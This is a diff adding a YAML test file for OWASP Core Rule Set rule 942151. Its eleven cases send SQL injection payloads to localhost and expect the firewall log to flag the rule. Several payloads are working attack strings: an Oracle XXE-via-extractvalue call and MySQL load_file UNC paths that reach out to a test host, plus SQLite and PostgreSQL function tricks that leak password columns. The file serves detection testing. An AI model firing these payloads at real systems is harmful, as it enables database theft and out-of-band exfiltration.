@@ -1,0 +1,190 @@
+---
+meta:
+  author: "Christian Folini,azurit"
+  description: Various SQL injection tests
+  enabled: true
+  name: 942151.yaml
+tests:
+  - test_title: 942151-1
+    desc: "Advanced SQL injection"
+    stages:
+      - stage:
+          input:
+            dest_addr: 127.0.0.1
+            headers:
+              Host: localhost
+              User-Agent: "OWASP CRS test agent"
+              Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
+            method: POST
+            port: 80
+            uri: "/"
+            data: "var=foo'||(select extractvalue(xmltype('<?xml version=\"1.1\" encoding=\"UTF-8\"?><!DOCTYPE root [ <!ENTITY % tocob SYSTEM \"https://unit'||'tests.coreruleset.org/\">%tocob;"
+            version: HTTP/1.0
+          output:
+            log_contains: id "942151"
+  - test_title: 942151-2
+    desc: "Simple SQL injection"
+    stages:
+      - stage:
+          input:
+            dest_addr: 127.0.0.1
+            headers:
+              Host: localhost
+              User-Agent: "OWASP CRS test agent"
+              Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
+            method: POST
+            port: 80
+            uri: "/"
+            data: "var=/config.txt' (select load_file('\\\\\\\\unittests.coreruleset.org\\\\zow')) '"
+            version: HTTP/1.0
+          output:
+            log_contains: id "942151"
+  - test_title: 942151-3
+    desc: "Advanced SQL injection"
+    stages:
+      - stage:
+          input:
+            dest_addr: 127.0.0.1
+            headers:
+              Host: localhost
+              User-Agent: "OWASP CRS test agent"
+              Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
+            method: POST
+            port: 80
+            uri: "/"
+            data: "var=(select load_file('\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\unitests.corerule'||'set.org\\\\\\\\\\\\\\\\hvs'))"
+            version: HTTP/1.0
+          output:
+            log_contains: id "942151"
+  - test_title: 942151-4
+    desc: "Simple injection using 'fetch_in_set'"
+    stages:
+      - stage:
+          input:
+            dest_addr: 127.0.0.1
+            headers:
+              Host: localhost
+              User-Agent: "OWASP CRS test agent"
+              Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
+            method: POST
+            port: 80
+            uri: "/"
+            data: "var=, FIND_IN_SET('22', Category )"
+            version: HTTP/1.0
+          output:
+            log_contains: id "942151"
+  - test_title: 942151-5
+    desc: "SQL injection using 'likelihood' function"
+    stages:
+      - stage:
+          input:
+            dest_addr: 127.0.0.1
+            headers:
+              Host: localhost
+              User-Agent: "OWASP CRS test agent"
+              Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
+            method: POST
+            port: 80
+            uri: "/"
+            data: "email=1'%20%2B%201%20is%20likelihood(0.0%2C0.0)%20is%201--"
+            version: HTTP/1.0
+          output:
+            log_contains: id "942151"
+  - test_title: 942151-6
+    desc: "SQL injection using SQLite 'sqlite_compileoption_used' function"
+    stages:
+      - stage:
+          input:
+            dest_addr: 127.0.0.1
+            headers:
+              Host: localhost
+              User-Agent: "OWASP CRS test agent"
+              Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
+            method: POST
+            port: 80
+            uri: "/"
+            data: "email=admin%40example.com'%20or%20sqlite_compileoption_used%20(id)--"
+            version: HTTP/1.0
+          output:
+            log_contains: id "942151"
+  - test_title: 942151-7
+    desc: "SQL injection using SQLite 'sqlite_compileoption_get' function"
+    stages:
+      - stage:
+          input:
+            dest_addr: 127.0.0.1
+            headers:
+              Host: localhost
+              User-Agent: "OWASP CRS test agent"
+              Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
+            method: POST
+            port: 80
+            uri: "/"
+            data: "email=admin%40example.com'and%20not%20sqlite_compileoption_get%20(id)--"
+            version: HTTP/1.0
+          output:
+            log_contains: id "942151"
+  - test_title: 942151-8
+    desc: "SQL injection using PostgreSQL starts_with() function"
+    stages:
+      - stage:
+          input:
+            dest_addr: 127.0.0.1
+            headers:
+              Host: localhost
+              User-Agent: "OWASP CRS test agent"
+              Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
+            method: GET
+            port: 80
+            uri: "/index.php?id=starts_with(password,'a')::int"
+            version: HTTP/1.0
+          output:
+            log_contains: id "942151"
+  - test_title: 942151-9
+    desc: "SQL injection using PostgreSQL jsonb_pretty() function"
+    stages:
+      - stage:
+          input:
+            dest_addr: 127.0.0.1
+            headers:
+              Host: localhost
+              User-Agent: "OWASP CRS test agent"
+              Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
+            method: GET
+            port: 80
+            uri: "/index.php?id=jsonb_pretty(...(1,password)::jsonb)::int"
+            version: HTTP/1.0
+          output:
+            log_contains: id "942151"
+  - test_title: 942151-10
+    desc: "SQL injection using PostgreSQL json_build_object() function"
+    stages:
+      - stage:
+          input:
+            dest_addr: 127.0.0.1
+            headers:
+              Host: localhost
+              User-Agent: "OWASP CRS test agent"
+              Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
+            method: GET
+            port: 80
+            uri: "/index.php?id=...(json_build_object(1,password)::jsonb)::int"
+            version: HTTP/1.0
+          output:
+            log_contains: id "942151"
+  - test_title: 942151-11
+    desc: "SQL injection using unistr() function"
+    stages:
+      - stage:
+          input:
+            dest_addr: 127.0.0.1
+            headers:
+              Host: localhost
+              User-Agent: "OWASP CRS test agent"
+              Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
+            method: GET
+            port: 80
+            uri: "/index.php?id=unistr(password)::int"
+            version: HTTP/1.0
+          output:
+            log_contains: id "942151"
